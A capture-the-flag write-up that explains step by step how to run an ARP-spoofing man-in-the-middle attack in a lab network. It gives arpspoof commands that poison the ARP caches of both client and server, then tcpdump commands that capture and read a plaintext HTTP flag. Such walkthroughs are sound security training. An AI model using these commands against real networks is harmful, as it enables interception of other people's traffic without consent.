# [Hiding in your WiFi](https://nnsc.tf/challenges?challenge=devsecoops_Hiding+in+your+WiFi)

**Description:**

I'm on your network. There is a client at `10.10.10.20` that keeps fetching something from the web server at `10.10.10.10`, and the server only talks to the client.

You are `10.10.10.66`. You have `arpspoof` and `tcpdump`.

## 1. Connect to the challenge instance

The connection command given is:

```bash
ncat --ssl TARGET_IP 1337
```

This drops you straight into a shell already positioned inside the challenge network as `10.10.10.66`, not on your local machine. This matters because your local network interface is irrelevant to the challenge. Every command from here on runs inside this remote shell.

## 2. Confirm you environment

Before doing anything else, verify what you're working with:

```bash
id
ip addr show
ip route show
which arpspoof tcpdump
cat /proc/sys/net/ipv4/ip_forward
```

This confirms:

- You're a low-privilege user, not root
- Your interface is `eth0`, on the `10.10.10.0/24` network, with IP `10.10.10.66`
- `arpspoof` and `tcpdump` are available at `/usr/sbin/arpspoof` and `/usr/bin/tcpdump`
- `ip_forward` is already set to `1`, meaning the kernel will forward packets between interfaces once you're in the middle of the traffic path. This is important: without it, intercepting the traffic would break the connection between client and server instead of just letting you observe it.
  Also check permissions, since `arpspoof` and `tcpdump` normally need raw socket access:

```bash
sudo -l
getcap /usr/sbin/arpspoof /usr/bin/tcpdump
```

If `sudo` isn't installed and `getcap` returns nothing, don't worry, that just means the container was built with the required capabilities granted at the container level rather than as file capabilities. The way to confirm this is to just try running the tools.

## 3. Test tcpdump works without elevated privileges

```bash
tcpdump -i eth0 -c 5
```

If this captures packets without a permission error, you have what you need and can proceed directly.

## 4. Understand why you need multiple sessions

Since the shell reports "no job control", you can't rely on `Ctrl+Z`, `fg`, or `jobs` to manage multiple foreground processes cleanly in one session. The practical fix is to open several separate connections to the challenge, one per task, since each `ncat --ssl ...` connection is its own independent shell inside the same network namespace:

- One session to run `tcpdump` and capture traffic to a file
- One session to run `arpspoof` targeting the client
- One session to run `arpspoof` targeting the server
- One session left free to inspect the capture, list files, etc.

## 5. Start the packet capture

In session 1:

```bash
tcpdump -i eth0 -w /tmp/cap.pcap host 10.10.10.10 or host 10.10.10.20
```

This filters for only traffic involving the client or server, which cuts down on noise, and writes it to disk so you can inspect it later even if it scrolls past too fast to read live.

## 6. Poison both ARP caches

The key idea behind ARP spoofing is: the client currently believes the server's IP `10.10.10.10` maps to the server's real MAC address, and the server believes the client's IP `10.10.10.20` maps to the client's real MAC. You need to break both of those associations and insert yourself.

In session 2, tell the client that you are the server:

```bash
arpspoof -i eth0 -t 10.10.10.20 10.10.10.10
```

In session 3, tell the server that you are the client:

```bash
arpspoof -i eth0 -t 10.10.10.10 10.10.10.20
```

Both commands run continuously, sending forged ARP replies at regular intervals to keep both machines' ARP caches pointed at your MAC address instead of the real one. You need both directions running simultaneously, otherwise only one leg of the conversation routes through you and you won't see the full request/response pair.

You'll see output like:

```
2:0:0:0:0:66 2:0:0:0:0:20 0806 42: arp reply 10.10.10.10 is-at 2:0:0:0:0:66
```

This confirms the forged replies are going out.

## 7. Let it run and check the capture

Give it 20 to 30 seconds so the client's periodic fetch cycle has time to trigger while the poisoning is active. In session 4, check the capture file exists and inspect it:

```bash
ls -la /tmp/cap.pcap
tcpdump -r /tmp/cap.pcap -nn
```

At this point you're looking for actual TCP traffic between `10.10.10.10` and `10.10.10.20` on port 80, not just ARP packets. Once the poisoning takes hold, you'll start seeing full three way handshakes and HTTP exchanges show up, including lines like:

```
GET /flag.txt HTTP/1.1
```

followed later by:

```
HTTP/1.1 200 OK
```

with a payload length around 298 bytes, which is small enough to contain the flag directly in the response body.

Note that early on you'll likely also see some retransmitted or duplicate looking SYNs and ICMP redirect messages. This is expected while the ARP caches are still converging and the kernel is figuring out the new path. Once the poisoning stabilizes, you'll get clean, complete request/response pairs.

## 8. Extract the HTTP response payload

Now dump the ASCII content of the captured traffic to actually read the response body:

```bash
tcpdump -r /tmp/cap.pcap -A -nn 'tcp port 80 and host 10.10.10.10'
```

The `-A` flag prints packet contents in ASCII, which is what you need since HTTP is plaintext. Scroll to any `200 OK` response and read the body immediately following the HTTP headers, that's where the content of `flag.txt` will appear, in the format `NNS{...}`.

If the output is long, narrow it down:

```bash
tcpdump -r /tmp/cap.pcap -A -nn 'tcp port 80 and host 10.10.10.10' | grep -A 20 "200 OK"
```

<img width="1160" height="244" alt="SCREEN01" src="https://github.com/user-attachments/assets/49a94f42-ae84-47e1-af9f-dd226f89a64c" />

